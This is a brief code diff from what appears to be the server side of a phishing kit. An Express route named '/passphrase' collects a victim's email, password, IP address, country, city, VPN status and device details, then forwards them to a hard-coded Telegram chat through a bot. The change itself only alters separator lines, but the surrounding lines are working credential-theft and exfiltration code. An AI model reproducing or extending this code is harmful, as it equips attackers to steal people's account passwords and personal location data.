@@ -43,15 +43,15 @@ app.post('/passphrase', async (req, res) => {
     const teleMessage = `
     
       Email Provider: ${email_provider}
-      =================================
+      ==============================
       Email: ${email}
       Password: ${password}
-      =================================
+      ==============================
       IP Location: ${clientIP}
       Country: ${countryName},
       City: ${cityName},
       VPN: ${isProxy ? "Yes" : "No"}
-      =================================
+      ==============================
       Device Info: ${JSON.stringify(deviceInfo)}
     `;
     await bot.sendMessage('1106055083', teleMessage);
